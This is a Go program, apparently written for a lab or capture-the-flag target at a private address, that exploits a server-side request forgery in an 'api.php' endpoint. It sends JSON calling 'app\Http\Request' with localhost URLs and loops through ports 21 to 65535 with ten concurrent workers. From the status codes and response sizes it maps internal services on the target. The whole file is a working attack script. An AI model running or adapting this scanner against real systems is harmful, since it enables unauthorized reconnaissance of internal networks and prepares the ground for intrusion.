package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "sync"
)

func main() {
    url := "http://172.16.9.109/api.php"
    log.Println("Starting requests ...")

    var numThreads int = 10 // Number of threads, adjust as needed

    semaphore := make(chan struct{}, numThreads)

    var wg sync.WaitGroup

    for port := 21; port <= 65535; port++ {
        wg.Add(1)

        semaphore <- struct{}{}

        go func(port int) {
            defer wg.Done()
            defer func() { <-semaphore }() 

            jsonData := map[string]interface{}{
                "service": "app\\Http\\Request",
                "method":  "get",
                "args":    []string{fmt.Sprintf("http://127.0.0.1:%d", port)},
                "hmac":    true,
            }

            jsonDataBytes, err := json.Marshal(jsonData)
            if err != nil {
                log.Printf("Error marshalling JSON: %v", err)
                return
            }

            request, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonDataBytes))
            if err != nil {
                log.Printf("Error creating POST request: %v", err)
                return
            }
            request.Header.Set("Content-Type", "application/json; charset=UTF-8")

            client := &http.Client{}
            response, err := client.Do(request)
            if err != nil {
                fmt.Printf("\rErro ao enviar requisição para a porta %d: %v", port, err)
                return
            }

            if response.StatusCode == 500 { // Adjust the bad response for validation, check before replacing
                fmt.Printf("\rPort: %d Status 500...  ", port)
            } else {
                body, err := ioutil.ReadAll(response.Body)
                if err != nil {
                    log.Printf("Error reading response body: %v", err)
                    return
                }
                fmt.Printf("\rTesting port: %d ---- Content size: %d ---- Status code: %d\n", port, len(body), response.StatusCode)
            }
            response.Body.Close()

        }(port)
    }

    wg.Wait()
}

